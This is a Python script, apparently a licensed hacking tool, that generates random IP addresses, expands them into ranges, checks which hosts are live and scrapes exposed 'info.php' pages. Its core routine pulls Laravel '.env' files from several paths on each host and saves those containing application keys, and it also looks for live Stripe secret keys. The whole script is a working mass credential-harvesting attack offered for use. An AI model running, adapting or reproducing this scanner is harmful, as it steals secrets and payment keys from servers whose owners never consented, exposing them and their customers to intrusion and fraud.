import random
import os
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests
try:
    import bs4
except:
    os.system("pip3 install bs4")
    import bs4
try:
    import colorama
except:
    os.system("pip3 install colorama")
    import colorama
from colorama import Fore, Style
from multiprocessing.dummy import Pool
from queue import Queue
from configparser import ConfigParser
from threading import Thread
from threading import *
import sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from bs4 import BeautifulSoup
import urllib.request as urllib2 
import tkinter as tk
import concurrent.futures
import time

os.system('cls' if os.name == 'nt' else 'clear')

def connection_check():
   try:
    urllib2.urlopen('http://google.com', timeout=2)
    return True
   except:
    return False

def get_date():
 r=requests.get('https://www.calendardate.com/todays.htm')
 soup = BeautifulSoup(r.text ,'html.parser')
 a=soup.find_all(id='tprg')[6].get_text()
 a=a.replace('-','')
 a=a.replace(' ','')
 return a

if connection_check() == True:
 day = '2022-09-14' #year-month-day
 limit= int(day.replace('-',''))
 current_date = int(get_date())
 if current_date <= limit:
  print(f'Login Success. You can use this tool till {day}')
 else:
  print('Validity Expired. To renew msg @Gunnu_xD')
  exit()
else:
    print('Network Error')
    exit()
def gen(brapa):
     a = random.randrange(0, 255, 1)
     b = random.randrange(0, 255, 1)
     c = random.randrange(0, 255, 1)
     d = random.randrange(0, 255, 1)
     ip = str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)
     open('ip.txt', 'a').write(ip+'\n')

def genip():

    brapa = int(input('How Much IP? '))
    thread = 1000000
    print("Generating...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=(thread)) as executor:
     worker_to_queue = {
        executor.submit(gen): x for x in range(brapa)
     }
     for worker in concurrent.futures.as_completed(worker_to_queue):
            worker_to_queue[worker]
    print('[+] SUCCESS GENERATE IP!! ')


def yoy():

    lis = input('Your IP List -> ')
    tol = open(lis, 'r').readlines()
    for i in tol:
        yaa = i.strip()
        part = yaa.split('.')
        a = '.'

        start = 0
        end = 255
        for j in range(start, end + 1):
            for k in range(start, end + 1):
                ale = part[0] + a + part[1] + a + str(j) + a + str(k)
                open('ranged.txt', 'a').write(ale+'\n')
        print(yaa, '-> RANGED!!')


def valid(hayuk):
        try:
            r = requests.get('http://{}'.format(hayuk), allow_redirects=True, verify=False, timeout=5)
            if r.status_code == 200:
                print(hayuk, '-> LIVE IP')
                open('liveip.txt', 'a').write(hayuk+'\n')
            elif '<title>' in r.text:
                print(hayuk, '-> LIVE IP')
                open('liveip.txt', 'a').write(hayuk+'\n')
            else:
              r = requests.get('https://{}'.format(hayuk), verify=True, allow_redirects=True, timeout=5)
              if r.status_code == 200:
               print(hayuk, '-> LIVE IP')
               open('liveip.txt', 'a').write(hayuk+'\n')
              elif '<title>' in r.text:
               print(hayuk, '-> LIVE IP')
               open('liveip.txt', 'a').write(hayuk+'\n')
              else:
                pass


        except Exception:
            print(hayuk, '-> DEAD')




def check(inf):
        try:
            r = requests.get(f'http://{inf}/info.php', timeout=3)
            if r.status_code == 200:
                print(inf, '-> FOUND')
                open('info.txt', 'a').write(r.text+'\n')
            elif 'system' in r.text:
                print(inf, '-> FOUND')
                open('info.txt', 'a').write(r.text+'\n')
            else:
                pass
        except:
            print(inf, '-> DEAD')



class androxgh0st:
    def get_scan(self, text, url):
        if "sk_live_" in text:
            save = open('Results/ValidURL.txt', 'a')
            save.write(url+'\n')
            save.close()
            return True
        else:
         return False



def main(url):
    if "://" in url:
            url = url
    else:
            url = "http://"+url
    if url.endswith('/'):
            url = url[:-1]
    resp = False
    try:
        text = ''+url
        headers = {
            'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_sourcea = requests.get(
            url+"/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourceb = requests.get(
            url+"/core/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourcec = requests.get(
            url+"/app/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourced = requests.get(
            url+"/public/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourcef = requests.get(
            url+"/vendor/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourceg = requests.get(
            url+"/laravel/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourceh = requests.get(
            url+"/database/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourcei = requests.get(
            url+"/data/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        get_sourcee = requests.get(url+"/prod/.env", headers=headers, timeout=10, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_sourcea:
            resp = get_sourcea
        elif "APP_KEY=" in get_sourceb:
            resp = get_sourceb
        elif "APP_KEY=" in get_sourcec:
            resp = get_sourcec
        elif "APP_KEY=" in get_sourced:
            resp = get_sourced
        elif "APP_KEY=" in get_sourcef:
            resp = get_sourcef
        elif "APP_KEY=" in get_sourceg:
            resp = get_sourceg
        elif "APP_KEY=" in get_sourceh:
            resp = get_sourceh
        elif "APP_KEY=" in get_sourcei:
            resp = get_sourcei
        elif "APP_KEY=" in get_sourcee:
                resp = get_sourcee
        if resp:
            print(url, '-> FOUND')
            open('env.txt', 'a').write(resp+'\n')
        else:
            print(url, '-> DEAD')
    except:
        print(url, '-> DEAD')



def thread(li):
    ase = open(li, 'r').read().splitlines()
    p = Pool((thr))
    p.map(valid, ase)

def threads(li):
    ase = open(li, 'r').read().splitlines()
    p = Pool((thr))
    p.map(check, ase)

def threadsk(li):
    ase = open(li, 'r').read().splitlines()
    p = Pool((thr))
    p.map(main, ase)

if __name__ == "__main__":
    print(Fore.MAGENTA + """

   ______  __  __  _   __  _   __  __  __
  / ____/ / / / / / | / / / | / / / / / /
 / / __  / / / / /  |/ / /  |/ / / / / / 
/ /_/ / / /_/ / / /|  / / /|  / / /_/ /  
\____/  \____/ /_/ |_/ /_/ |_/  \____/                    
"""+'\n')
    print(Fore.LIGHTBLUE_EX + '')
    print('(+) 1. IP GENERATOR')
    print('(+) 2. IP RANGER')
    print('(+) 3. IP CHECKER')
    print('(+) 4. INFO EXTRACTOR (Laravel/WordPress)')
    print('(+) 5. ENV EXTRACTOR [(Laravel) Put Live IPs]')
    print('(+) 6. Exit'+'\n')

    pilih = input('Select Options -> ')

    if pilih == '1':
        genip()
    elif pilih == '2':
        yoy()
    elif pilih == '3':
        diem = input('Input Your IP LIST -> ')
        thr = int(input('THREAD -> '))
        thread(diem)
    elif pilih == '4':
        inf = input('Input Your IP LIST -> ')
        thr = int(input('THREAD -> '))
        threads(inf)
    elif pilih == '5':
        inf = input('Input Your IP LIST -> ')
        thr = int(input('THREAD -> '))
        threadsk(inf)	
    elif pilih == '6':
        os.system('cls' if os.name == 'nt' else 'clear')
        exit()
    else:
        print('No Options!')
        time.sleep(3)
        os.system('cls' if os.name == 'nt' else 'clear')
        exit()